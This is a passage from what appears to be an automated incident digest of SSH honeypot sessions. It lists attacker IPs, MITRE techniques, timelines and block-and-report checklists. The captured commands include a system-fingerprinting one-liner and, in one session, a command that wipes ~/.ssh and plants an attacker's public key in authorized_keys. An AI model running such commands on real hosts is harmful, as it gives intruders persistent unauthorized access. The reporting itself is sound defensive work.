| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.command.input` |
| `2026-07-26 03:54:16` | `cowrie.log.closed` |
| `2026-07-26 03:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf91a67b7ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:55 |
| **Last Seen** | 2026-07-26 03:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:55:48` | `cowrie.session.connect` |
| `2026-07-26 03:55:49` | `cowrie.client.version` |
| `2026-07-26 03:55:49` | `cowrie.client.kex` |
| `2026-07-26 03:55:50` | `cowrie.login.success` |
| `2026-07-26 03:55:51` | `cowrie.session.params` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.success` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.command.input` |
| `2026-07-26 03:55:51` | `cowrie.log.closed` |
| `2026-07-26 03:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b798b61a45c9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:57 |
| **Last Seen** | 2026-07-26 03:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:57:25` | `cowrie.session.connect` |
| `2026-07-26 03:57:25` | `cowrie.client.version` |
| `2026-07-26 03:57:25` | `cowrie.client.kex` |
| `2026-07-26 03:57:26` | `cowrie.login.success` |
| `2026-07-26 03:57:28` | `cowrie.session.params` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.success` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.command.input` |
| `2026-07-26 03:57:28` | `cowrie.log.closed` |
| `2026-07-26 03:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc346203435

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:59 |
| **Last Seen** | 2026-07-26 03:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:59:04` | `cowrie.session.connect` |
| `2026-07-26 03:59:04` | `cowrie.client.version` |
| `2026-07-26 03:59:04` | `cowrie.client.kex` |
| `2026-07-26 03:59:05` | `cowrie.login.success` |
| `2026-07-26 03:59:06` | `cowrie.session.params` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.success` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.command.input` |
| `2026-07-26 03:59:06` | `cowrie.log.closed` |
| `2026-07-26 03:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53472c6c4155

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:00 |
| **Last Seen** | 2026-07-26 04:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:00:45` | `cowrie.session.connect` |
| `2026-07-26 04:00:45` | `cowrie.client.version` |
| `2026-07-26 04:00:45` | `cowrie.client.kex` |
| `2026-07-26 04:00:46` | `cowrie.login.success` |
| `2026-07-26 04:00:47` | `cowrie.session.params` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.success` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.command.input` |
| `2026-07-26 04:00:47` | `cowrie.log.closed` |
| `2026-07-26 04:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-175b757c65d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:02 |
| **Last Seen** | 2026-07-26 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:02:28` | `cowrie.session.connect` |
| `2026-07-26 04:02:28` | `cowrie.client.version` |
| `2026-07-26 04:02:28` | `cowrie.client.kex` |
| `2026-07-26 04:02:29` | `cowrie.login.success` |
| `2026-07-26 04:02:29` | `cowrie.session.params` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.success` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.command.input` |
| `2026-07-26 04:02:29` | `cowrie.log.closed` |
| `2026-07-26 04:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-636e9a8de5be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:04 |
| **Last Seen** | 2026-07-26 04:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:04:11` | `cowrie.session.connect` |
| `2026-07-26 04:04:12` | `cowrie.client.version` |
| `2026-07-26 04:04:12` | `cowrie.client.kex` |
| `2026-07-26 04:04:12` | `cowrie.login.success` |
| `2026-07-26 04:04:14` | `cowrie.session.params` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.success` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.command.input` |
| `2026-07-26 04:04:14` | `cowrie.log.closed` |
| `2026-07-26 04:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf27f5b7566

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-07-26 04:04 |
| **Last Seen** | 2026-07-26 04:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:04:46` | `cowrie.session.connect` |
| `2026-07-26 04:04:46` | `cowrie.client.version` |
| `2026-07-26 04:04:46` | `cowrie.client.kex` |
| `2026-07-26 04:04:48` | `cowrie.login.success` |
| `2026-07-26 04:04:48` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc237e804781

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:05 |
| **Last Seen** | 2026-07-26 04:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:05:42` | `cowrie.session.connect` |
| `2026-07-26 04:05:42` | `cowrie.client.version` |
| `2026-07-26 04:05:42` | `cowrie.client.kex` |
| `2026-07-26 04:05:43` | `cowrie.login.success` |
| `2026-07-26 04:05:44` | `cowrie.session.params` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.success` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.command.input` |
| `2026-07-26 04:05:44` | `cowrie.log.closed` |
| `2026-07-26 04:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a65160d7792

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:07 |
| **Last Seen** | 2026-07-26 04:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:07:08` | `cowrie.session.connect` |
| `2026-07-26 04:07:08` | `cowrie.client.version` |
| `2026-07-26 04:07:08` | `cowrie.client.kex` |
| `2026-07-26 04:07:09` | `cowrie.login.success` |
| `2026-07-26 04:07:10` | `cowrie.session.params` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.success` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.command.input` |
| `2026-07-26 04:07:10` | `cowrie.log.closed` |
| `2026-07-26 04:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881a8b025920

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-07-26 04:08 |
| **Last Seen** | 2026-07-26 04:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:08:09` | `cowrie.session.connect` |
| `2026-07-26 04:08:10` | `cowrie.client.version` |
| `2026-07-26 04:08:10` | `cowrie.client.kex` |
| `2026-07-26 04:08:13` | `cowrie.login.success` |
| `2026-07-26 04:08:13` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83f7707c4aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:08 |
| **Last Seen** | 2026-07-26 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:08:37` | `cowrie.session.connect` |
| `2026-07-26 04:08:37` | `cowrie.client.version` |
| `2026-07-26 04:08:37` | `cowrie.client.kex` |
| `2026-07-26 04:08:38` | `cowrie.login.success` |
| `2026-07-26 04:08:40` | `cowrie.session.params` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.success` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.command.input` |
| `2026-07-26 04:08:40` | `cowrie.log.closed` |
| `2026-07-26 04:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3907db962ed8

| Field | Detail |
|---|---|
| **Source IP** | `135.149.57[.]58` |
| **First Seen** | 2026-07-26 04:08 |
| **Last Seen** | 2026-07-26 04:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:08:44` | `cowrie.session.connect` |
| `2026-07-26 04:08:44` | `cowrie.client.version` |
| `2026-07-26 04:08:45` | `cowrie.client.kex` |
| `2026-07-26 04:08:46` | `cowrie.login.success` |
| `2026-07-26 04:08:47` | `cowrie.session.params` |
| `2026-07-26 04:08:47` | `cowrie.command.input` |
| `2026-07-26 04:08:47` | `cowrie.command.failed` |
| `2026-07-26 04:08:48` | `cowrie.log.closed` |
| `2026-07-26 04:08:48` | `cowrie.session.params` |
| `2026-07-26 04:08:48` | `cowrie.command.input` |
| `2026-07-26 04:08:49` | `cowrie.session.file_download` |
| `2026-07-26 04:08:49` | `cowrie.log.closed` |
| `2026-07-26 04:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.149.57[.]58` to AbuseIPDB if not already reported
- [ ] Block `135.149.57[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2a71321633

| Field | Detail |
|---|---|
| **Source IP** | `135.149.57[.]58` |
| **First Seen** | 2026-07-26 04:08 |
| **Last Seen** | 2026-07-26 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:08:49` | `cowrie.session.connect` |
| `2026-07-26 04:08:50` | `cowrie.client.version` |
| `2026-07-26 04:08:50` | `cowrie.client.kex` |
| `2026-07-26 04:08:53` | `cowrie.login.success` |
| `2026-07-26 04:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.149.57[.]58` to AbuseIPDB if not already reported
- [ ] Block `135.149.57[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11bd087a00c3

| Field | Detail |
|---|---|
| **Source IP** | `135.149.57[.]58` |
| **First Seen** | 2026-07-26 04:08 |
| **Last Seen** | 2026-07-26 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:08:53` | `cowrie.session.connect` |
| `2026-07-26 04:08:54` | `cowrie.client.version` |
| `2026-07-26 04:08:54` | `cowrie.client.kex` |
| `2026-07-26 04:08:55` | `cowrie.login.success` |
| `2026-07-26 04:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.149.57[.]58` to AbuseIPDB if not already reported
- [ ] Block `135.149.57[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18206bbf994a

| Field | Detail |
|---|---|
| **Source IP** | `115.191.38[.]87` |
| **First Seen** | 2026-07-26 04:09 |
| **Last Seen** | 2026-07-26 04:14 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
